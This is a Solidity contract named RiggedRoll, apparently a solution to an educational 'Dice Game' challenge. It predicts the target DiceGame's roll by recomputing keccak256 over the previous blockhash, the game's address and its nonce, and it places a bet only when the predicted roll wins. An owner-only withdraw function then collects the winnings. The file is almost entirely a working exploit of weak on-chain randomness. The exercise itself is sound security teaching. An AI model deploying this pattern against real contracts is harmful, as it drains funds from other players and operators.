pragma solidity >=0.8.0 <0.9.0;
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

error RiggedRoll__DidntSendEnoughValue();
error RiggedRoll__WithdrawFailed();

contract RiggedRoll is Ownable {
    DiceGame public diceGame;

    constructor(address payable diceGameAddress) {
        diceGame = DiceGame(diceGameAddress);
    }

    function withdraw() external onlyOwner {
        (bool success, ) = msg.sender.call{value: address(this).balance}("");

        if (!success) {
            revert RiggedRoll__WithdrawFailed();
        }
    }

    function riggedRoll() external payable {
        if (msg.value < 0.002 ether) {
            revert RiggedRoll__DidntSendEnoughValue();
        }

        uint256 predictedValue = predictHash();

        if (predictedValue <= 2) {
            diceGame.rollTheDice{value: msg.value}();
        }
    }

    receive() external payable {}

    function predictHash() private view returns (uint256 roll) {
        uint256 nonce = diceGame.nonce();
        bytes32 prevHash = blockhash(block.number - 1);
        bytes32 hash = keccak256(
            abi.encodePacked(prevHash, address(diceGame), nonce)
        );
        roll = uint256(hash) % 16;
    }
}
